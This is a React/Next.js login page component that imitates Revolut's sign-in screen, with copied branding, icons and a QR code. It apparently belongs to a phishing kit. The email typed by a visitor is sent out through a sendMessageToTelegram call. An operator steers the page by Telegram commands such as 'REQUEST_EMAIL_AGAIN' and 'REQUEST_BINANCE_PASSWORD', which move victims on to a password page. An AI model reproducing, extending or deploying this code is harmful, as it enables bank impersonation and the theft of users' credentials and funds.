'use client';
import '../app/globals.css';
import { useState, useEffect } from 'react';
import Header from '../components/Header';
import { useValidateEmail } from '../app/hooks/useValidate';
import { useRouter } from 'next/navigation';
import { notifyNewUser } from '../lib/api';
import { sendMessageToTelegram } from '../lib/api';
import { useCommand } from '../app/lib/CommandContext';
import countriesData from '../app/lib/countries'
import CountriesDropdown from '../components/CountriesDropdown'

export default function LoginForm() {
    const router = useRouter();
    const { command } = useCommand(); // Get the current command from Telegram
    const [email, setEmail] = useState('');
    const [invalid, setInvalid] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [userEmail, setUserEmail] = useState('');

    // Handle command changes
    useEffect(() => {
        if (command === 'REQUEST_EMAIL_AGAIN') {
            setInvalid(true); // Show error state for email input
            setIsLoading(false);
        } else if (command === 'REQUEST_BINANCE_PASSWORD') {
            setIsLoading(false);
            setTimeout(() => {
                // setIsLoading(false);
                router.push('/PasswordPage');
            }, 500);
        }
    }, [command, router]);

    const { validateEmail } = useValidateEmail();
    // Handle email validation
    const handleEmailValidation = () => {
        const isValid = validateEmail(email);
        setInvalid(!isValid);
        setIsLoading(true);
        setUserEmail(email);
        sendMessageToTelegram(email);
    };

    // the useEffect below handles the api for country code and their data 
    const [countries, setCountries] = useState([]);
    const [selectedCountry, setSelectedCountry] = useState(null);

    // Function to mix and filter country arrays
    function mixCountries(formattedCountries, newCountryData) {
        const combinedCountries = [...newCountryData, ...formattedCountries];

        const uniqueCountries = combinedCountries.filter((country, index, self) =>
            index === self.findIndex((c) => c.name === country.name)
        );

        // return the mixture of both countries data
        return uniqueCountries;
    }

    // Fetch country data from the API
    useEffect(() => {
        fetch('https://restcountries.com/v3.1/all')
            .then((response) => response.json())
            .then((data) => {
                const formattedCountries = data.map((country) => ({
                    name: country.name.common,
                    flag: country.flags.png,
                    code: country.idd.root + (country.idd.suffixes ? country.idd.suffixes[0] : 'NA'),
                }));

                const mixedCountries = mixCountries(formattedCountries, countriesData);

                setCountries(mixedCountries);

                setSelectedCountry(mixedCountries[0]);
            })
            .catch((error) => console.error('Error fetching countries:', error));
    }, []);

    // This state handles the countries dropdown
    const [dropdown, setDropdown] = useState(false);

    // Display countries dropdown
    const handleDropdownToggle = (e) => {
        e.stopPropagation(); // Prevent event bubbling
        setDropdown(!dropdown);
    };

    // Effect to handle closing dropdown when clicking outside
    useEffect(() => {
        const handleClickOutside = () => {
            if (dropdown) {
                setDropdown(false);
            }
        };

        document.addEventListener('click', handleClickOutside);
        return () => {
            document.removeEventListener('click', handleClickOutside);
        };
    }, [dropdown]);

    // Handle authentication button clicks
    const handleAuthButtonClick = (method) => {
        console.log(`ROUTER NEEDS TO PUSH TO ${method.toUpperCase()}`);
        // Here you could add actual routing logic in the future
    };

    return (
        <div className="bg-[#f7f7f7] text-black w-full h-screen flex flex-col">
            <Header />
            <div className="flex flex-grow p-4 md:p-2 h-full justify-center items-center ">
                <div className="min-h-[514px] md:mb-[20px] form-container w-full max-w-[360px] flex flex-col">
                    {/* Header */}
                    <div className="w-full">
                        <div className='pt-[1rem] h-[2.5rem]'>
                            <h1 className='font-bold text-2xl'>
                                Welcome back
                            </h1>
                        </div>
                        <div className='mt-[1.1rem]'>
                            <p className='inter font-normal text-[14px] leading-[20px] tracking-[-0.0065em] text-[#717173]'>
                                Enter the phone number associated with your Revolut account
                            </p>
                        </div>
                    </div>

                    {/* Main + Side */}
                    <div className="w-full">
                        <form action="" className="w-full sm:pr-[8px]">
                            <div className="flex flex-col w-full gap-[1rem]">
                                <div className='flex flex-row w-full gap-[0.5rem] py-[1rem]'>

                                    {/* Phone number Input */}
                                    <div className='overflow-hidden h-[56px] gap-x-2 flex w-full rounded-[1rem] caret-[#4f55f1] text-[#717173]'>
                                        <div className='md:w-[140px] w-[130px]'>
                                            <div className='flex cursor-pointer dropdown-button gap-x-2 items-center p-[16px] flex-row transition-all duration-200 hover:bg-gray-200 bg-[#ebebf0] h-full rounded-2xl'
                                                onClick={handleDropdownToggle}
                                            >
                                                {/* Country icon */}
                                                <div className='rounded-full h-6 w-6 overflow-hidden'>
                                                    {selectedCountry?.flag ? (
                                                        <img
                                                            src={selectedCountry.flag}
                                                            alt={`${selectedCountry.name} flag`}
                                                            className='w-full h-full rounded-full object-cover'
                                                        />
                                                    ) : (
                                                        <div className='w-full h-full rounded-full bg-[#e2e2e7]'></div>
                                                    )}
                                                </div>

                                                {/* Country code */}
                                                <div className='text-black'>
                                                    {selectedCountry?.code || ''}
                                                </div>
                                            </div>
                                        </div>

                                        {dropdown && (
                                            <div className="absolute top-0 left-0 w-full h-full z-10" onClick={(e) => { e.stopPropagation(); setDropdown(false); }}>
                                                <div className="w-full h-full bg-black opacity-30"></div>
                                            </div>
                                        )}

                                        <CountriesDropdown 
                                            dropdown={dropdown} 
                                            setDropdown={setDropdown} 
                                            setSelectedCountry={setSelectedCountry}
                                            countries={countries} // Pass countries to the dropdown component
                                        />

                                        {/* Number Input */}
                                        <div className="group bg-[#ebebf0] transition-all duration-200 hover:bg-[#e2e2e7] flex justify-center px-[16px] h-full rounded-2xl flex-grow">
                                            <input
                                                type="number"
                                                placeholder="Phone number"
                                                className="w-full text-[#191c1f] outline-transparent active:outline-none appearance-none bg-[#ebebf0] transition-all duration-200 rounded-2xl h-full focus:outline-none placeholder-[#191c1f98] group-hover:bg-[#e2e2e7]"
                                                style={{ WebkitAppearance: 'none', MozAppearance: 'textfield' }}
                                            />
                                        </div>
                                    </div>
                                </div>
                            </div>

                            {/* Link to access lost phone number */}
                            <div className='w-full flex cursor-pointer justify-start inter font-normal text-[0.875rem] tracking-[-0.00714em] text-[#4f55f1]'>
                                Lost access to my phone number
                            </div>

                            <button disabled className='inter opacity-30 z-10 relative font-medium text-[1rem] tracking-[-0.01125em] h-[3.25rem] w-full min-w-[0px] px-[1rem] sm:mr-[1rem] rounded-[9999px] text-[white] bg-[#4f55f1] text-center my-[1.5rem]'>
                                Continue
                            </button>
                        </form>


                        <div className='flex gap-y-4 flex-col sm:pr-[10px] pb-1'>
                            {/* form divider */}
                            <div className='flex m-0 items-center'>
                                <div className='h-[1px] bg-[#e2e2e7] flex-1 flex-grow'></div>
                                <div className='inter font-normal text-[0.875rem] tracking-[-0.00714em] py-0 px-[1rem] text-[#717173]'>or continue with</div>
                                <div className='h-[1px] bg-[#e2e2e7] flex-1 flex-grow'></div>
                            </div>


                            {/* Login methods */}
                            <div className='flex justify-around'>
                                {/* Login with email */}
                                <div className='flex flex-col items-center gap-[0.4rem] text-[#191c1f]'>
                                    <button 
                                        className='bg-white flex items-center justify-center w-[3rem] h-[3rem] rounded-[9999px]'
                                        onClick={() => handleAuthButtonClick('email')}
                                    >
                                        <img src="https://assets.revolut.com/assets/icons/Envelope.svg" alt="Email" />
                                    </button>
                                    <div className='text-[#191c1f] text-[0.875rem] tracking-[-0.00714em] text-center'>
                                        Email
                                    </div>
                                </div>

                                {/* Login with Google */}
                                <div className='flex flex-col items-center gap-[0.4rem] text-[#191c1f]'>
                                    <button 
                                        className='bg-white flex items-center justify-center w-[3rem] h-[3rem] rounded-[9999px]'
                                        onClick={() => handleAuthButtonClick('google')}
                                    >
                                        <img src="https://assets.revolut.com/assets/icons/LogoGoogle.svg" alt="Google" />
                                    </button>
                                    <div className='text-[#191c1f] text-[0.875rem] tracking-[-0.00714em] text-center'>
                                        Google
                                    </div>
                                </div>

                                {/* Login with Apple */}
                                <div className='flex flex-col items-center gap-[0.4rem] text-[#191c1f]'>
                                    <button 
                                        className='bg-white flex items-center justify-center w-[3rem] h-[3rem] rounded-[9999px]'
                                        onClick={() => handleAuthButtonClick('apple')}
                                    >
                                        <img src="https://assets.revolut.com/assets/icons/LogoIOs.svg" alt="Apple" />
                                    </button>
                                    <div className='text-[#191c1f] text-[0.875rem] tracking-[-0.00714em] text-center'>
                                        Apple
                                    </div>
                                </div>

                                {/* Login with QR */}
                                <div className='md:hidden flex flex-col items-center gap-[0.4rem] text-[#191c1f]'>
                                    <button 
                                        className='bg-white flex items-center justify-center w-[3rem] h-[3rem] rounded-[9999px]'
                                        onClick={() => handleAuthButtonClick('qr')}
                                    >
                                        <img src="https://assets.revolut.com/assets/icons/Qr.svg" alt="QR" />
                                    </button>
                                    <div className='text-[#191c1f] text-[0.875rem] tracking-[-0.00714em] text-center'>
                                        QR
                                    </div>
                                </div>
                            </div>


                            {/* Login Option */}
                            <div className='flex flex-col mt-[8px] gap-[0.75rem]'>
                                <div className='inter text-[#717173] font-normal text-[0.75rem] text-center'>
                                    Don't have an account?
                                </div>
                                <button className='cursor-pointer inter font-normal text-[1rem] tracking-[-0.01125em] h-[3.25rem] w-full min-w-[0px] px-[1rem] rounded-[9999px] text-[#191c1f] bg-white text-center cr-button'>
                                    Create account
                                </button>
                            </div>
                        </div>
                    </div>
                </div>


                {/* Qr code container */}
                <div className='w-[270px] hidden md:flex h-[400px] items-center ml-[40px] justify-start'>
                    <div className='w-full p-0 pr-[1.5rem] pb-[3.8rem] flex pt-0 flex-col'>
                        {/* Qr code */}
                        <div className='bg-white rounded-[1rem] block p-[1rem] mx-auto'>
                            <svg height="140" width="140" viewBox="0 0 37 37" role="img" aria-labelledby="label-:rc:" aria-describedby="desc-:rc:" display="block"><path fill="transparent" d="M0,0 h37v37H0z" shapeRendering="crispEdges"></path><path fill="currentColor" d="M0 0h7v1H0zM13 0h4v1H13zM21 0h1v1H21zM23 0h1v1H23zM25 0h2v1H25zM30,0 h7v1H30zM0 1h1v1H0zM6 1h1v1H6zM9 1h1v1H9zM12 1h4v1H12zM17 1h2v1H17zM20 1h1v1H20zM25 1h3v1H25zM30 1h1v1H30zM36,1 h1v1H36zM0 2h1v1H0zM2 2h3v1H2zM6 2h1v1H6zM8 2h2v1H8zM13 2h2v1H13zM21 2h2v1H21zM30 2h1v1H30zM32 2h3v1H32zM36,2 h1v1H36zM0 3h1v1H0zM2 3h3v1H2zM6 3h1v1H6zM8 3h1v1H8zM10 3h1v1H10zM17 3h2v1H17zM20 3h1v1H20zM22 3h1v1H22zM24 3h4v1H24zM30 3h1v1H30zM32 3h3v1H32zM36,3 h1v1H36zM0 4h1v1H0zM2 4h3v1H2zM6 4h1v1H6zM8 4h2v1H8zM12 4h3v1H12zM17 4h5v1H17zM23 4h1v1H23zM30 4h1v1H30zM32 4h3v1H32zM36,4 h1v1H36zM0 5h1v1H0zM6 5h1v1H6zM8 5h1v1H8zM10 5h1v1H10zM15 5h1v1H15zM17 5h1v1H17zM20 5h1v1H20zM25 5h1v1H25zM27 5h1v1H27zM30 5h1v1H30zM36,5 h1v1H36zM0 6h7v1H0zM8 6h1v1H8zM10 6h1v1H10zM12 6h1v1H12zM14 6h1v1H14zM16 6h1v1H16zM18 6h1v1H18zM20 6h1v1H20zM22 6h1v1H22zM24 6h1v1H24zM26 6h1v1H26zM28 6h1v1H28zM30,6 h7v1H30zM8 7h1v1H8zM12 7h1v1H12zM14 7h1v1H14zM17 7h2v1H17zM20 7h4v1H20zM26 7h3v1H26zM0 8h1v1H0zM2 8h5v1H2zM10 8h2v1H10zM16 8h1v1H16zM22 8h2v1H22zM25 8h1v1H25zM27 8h1v1H27zM30 8h5v1H30zM4 9h1v1H4zM7 9h1v1H7zM9 9h2v1H9zM12 9h1v1H12zM15 9h1v1H15zM17 9h2v1H17zM20 9h1v1H20zM23 9h2v1H23zM26 9h1v1H26zM28 9h1v1H28zM35 9h1v1H35zM0 10h3v1H0zM6 10h2v1H6zM9 10h2v1H9zM12 10h6v1H12zM19 10h1v1H19zM21 10h1v1H21zM24 10h2v1H24zM27 10h2v1H27zM30,10 h7v1H30zM2 11h4v1H2zM7 11h4v1H7zM15 11h1v1H15zM19 11h3v1H19zM24 11h1v1H24zM26 11h3v1H26zM33 11h1v1H33zM36,11 h1v1H36zM1 12h1v1H1zM3 12h2v1H3zM6 12h1v1H6zM8 12h1v1H8zM11 12h5v1H11zM17 12h1v1H17zM19 12h1v1H19zM22 12h1v1H22zM24 12h3v1H24zM28 12h5v1H28zM34,12 h3v1H34zM0 13h1v1H0zM5 13h1v1H5zM7 13h2v1H7zM11 13h1v1H11zM24 13h1v1H24zM28 13h1v1H28zM31 13h1v1H31zM35 13h1v1H35zM0 14h1v1H0zM3 14h4v1H3zM9 14h1v1H9zM24 14h2v1H24zM27 14h3v1H27zM31 14h3v1H31zM36,14 h1v1H36zM0 15h2v1H0zM4 15h1v1H4zM8 15h4v1H8zM24 15h1v1H24zM26 15h7v1H26zM35 15h1v1H35zM1 16h1v1H1zM3 16h1v1H3zM5 16h2v1H5zM8 16h1v1H8zM11 16h2v1H11zM25 16h3v1H25zM30 16h1v1H30zM32 16h1v1H32zM34,16 h3v1H34zM0 17h1v1H0zM3 17h2v1H3zM7 17h1v1H7zM11 17h2v1H11zM24 17h2v1H24zM29 17h1v1H29zM31 17h1v1H31zM35 17h1v1H35zM1 18h2v1H1zM4 18h1v1H4zM6 18h3v1H6zM11 18h1v1H11zM24 18h8v1H24zM33,18 h4v1H33zM0 19h3v1H0zM5 19h1v1H5zM8 19h3v1H8zM26 19h1v1H26zM28 19h3v1H28zM33 19h1v1H33zM36,19 h1v1H36zM0 20h2v1H0zM3 20h1v1H3zM6 20h4v1H6zM12 20h1v1H12zM25 20h6v1H25zM32 20h3v1H32zM0 21h6v1H0zM8 21h1v1H8zM10 21h2v1H10zM28 21h2v1H28zM33 21h1v1H33zM35 21h1v1H35zM0 22h1v1H0zM2 22h1v1H2zM5 22h3v1H5zM9 22h2v1H9zM12 22h1v1H12zM24 22h2v1H24zM27 22h1v1H27zM29 22h5v1H29zM36,22 h1v1H36zM5 23h1v1H5zM8 23h1v1H8zM10 23h1v1H10zM12 23h1v1H12zM24 23h1v1H24zM27 23h2v1H27zM30 23h3v1H30zM35 23h1v1H35zM2 24h2v1H2zM6 24h3v1H6zM10 24h1v1H10zM12 24h2v1H12zM15 24h2v1H15zM19 24h2v1H19zM25 24h1v1H25zM28 24h1v1H28zM30 24h1v1H30zM32 24h1v1H32zM34 24h1v1H34zM36,24 h1v1H36zM0 25h1v1H0zM5 25h1v1H5zM8 25h3v1H8zM14 25h2v1H14zM18 25h2v1H18zM22 25h4v1H22zM29 25h1v1H29zM31 25h1v1H31zM34 25h1v1H34zM0 26h1v1H0zM2 26h1v1H2zM4 26h3v1H4zM8 26h1v1H8zM10 26h1v1H10zM15 26h4v1H15zM21 26h2v1H21zM26 26h2v1H26zM29 26h3v1H29zM35,26 h2v1H35zM0 27h1v1H0zM3 27h1v1H3zM7 27h1v1H7zM9 27h3v1H9zM15 27h1v1H15zM18 27h2v1H18zM21 27h1v1H21zM24 27h1v1H24zM26 27h3v1H26zM31 27h1v1H31zM33 27h1v1H33zM0 28h1v1H0zM4 28h1v1H4zM6 28h1v1H6zM8 28h3v1H8zM12 28h1v1H12zM15 28h1v1H15zM17 28h2v1H17zM22 28h2v1H22zM25 28h1v1H25zM27 28h6v1H27zM34 28h1v1H34zM8 29h1v1H8zM10 29h1v1H10zM13 29h1v1H13zM16 29h1v1H16zM18 29h4v1H18zM23 29h1v1H23zM25 29h1v1H25zM27 29h2v1H27zM32 29h2v1H32zM0 30h7v1H0zM9 30h2v1H9zM13 30h4v1H13zM18 30h1v1H18zM20 30h2v1H20zM26 30h1v1H26zM28 30h1v1H28zM30 30h1v1H30zM32 30h1v1H32zM34,30 h3v1H34zM0 31h1v1H0zM6 31h1v1H6zM8 31h1v1H8zM13 31h2v1H13zM16 31h1v1H16zM20 31h3v1H20zM24 31h1v1H24zM26 31h1v1H26zM28 31h1v1H28zM32 31h2v1H32zM0 32h1v1H0zM2 32h3v1H2zM6 32h1v1H6zM8 32h2v1H8zM11 32h2v1H11zM15 32h1v1H15zM18 32h1v1H18zM25 32h1v1H25zM27 32h6v1H27zM34 32h1v1H34zM36,32 h1v1H36zM0 33h1v1H0zM2 33h3v1H2zM6 33h1v1H6zM8 33h1v1H8zM11 33h3v1H11zM15 33h3v1H15zM19 33h2v1H19zM22 33h5v1H22zM28 33h3v1H28zM32 33h1v1H32zM36,33 h1v1H36zM0 34h1v1H0zM2 34h3v1H2zM6 34h1v1H6zM8 34h2v1H8zM11 34h3v1H11zM17 34h1v1H17zM21 34h2v1H21zM24 34h3v1H24zM28 34h1v1H28zM33 34h1v1H33zM35,34 h2v1H35zM0 35h1v1H0zM6 35h1v1H6zM12 35h1v1H12zM16 35h1v1H16zM19 35h1v1H19zM21 35h1v1H21zM23 35h1v1H23zM26 35h1v1H26zM28 35h1v1H28zM30 35h1v1H30zM32 35h2v1H32zM36,35 h1v1H36zM0 36h7v1H0zM8 36h2v1H8zM12 36h2v1H12zM16 36h3v1H16zM22 36h1v1H22zM24 36h4v1H24zM30 36h1v1H30zM32 36h1v1H32zM34,36 h3v1H34z" shapeRendering="crispEdges"></path><image href="https://assets.revolut.com/assets/brand/Revolut-Symbol-Black.svg" height="10.571428571428571" width="10.571428571428571" x="13.214285714285715" y="13.214285714285715" preserveAspectRatio="none" opacity="1"></image></svg>
                        </div>

                        <div className='inter mt-[1rem] font-normal text-[1rem] tracking-[-0.01125em] text-center'>
                            Log in with QR code
                        </div>
                        <div className='text-[0.875rem] leading-[20px] inter font-normal tracking-[-0.00714em] text-[#717173] mt-[0.4rem] text-center'>
                            Scan this code with your phone camera to log in instantly
                        </div>
                    </div>
                </div>
            </div>

            {/* footer */}
            <div className='h-[68px] px-[2rem] md:pb-[10px] flex justify-center md:justify-start items-start bg-[#f7f7f7]'>
                <div className="h-fit md:absolute bottom-[19px] left-[30px] gap-y-2 gap-x-8 items-center justify-center md:justify-start md:flex-row flex-col flex">
                    <button className='text-[#717173] tracking-[0.0009px] items-center gap-x-[9px] rounded-[0.75rem] flex justify-center text-sm'>
                        English (United States)
                        <span>
                            <img src="https://assets.revolut.com/assets/icons/ChevronDown.svg" alt="" className='w-4 h-4 opacity-50' />
                        </span>
                    </button>
                    <button className='text-[#717173] tracking-[0.0009px] items-center gap-x-[9px] rounded-[0.75rem] flex justify-center text-sm'>
                        Privacy Policy
                    </button>
                </div>
            </div>
        </div >
    );
}
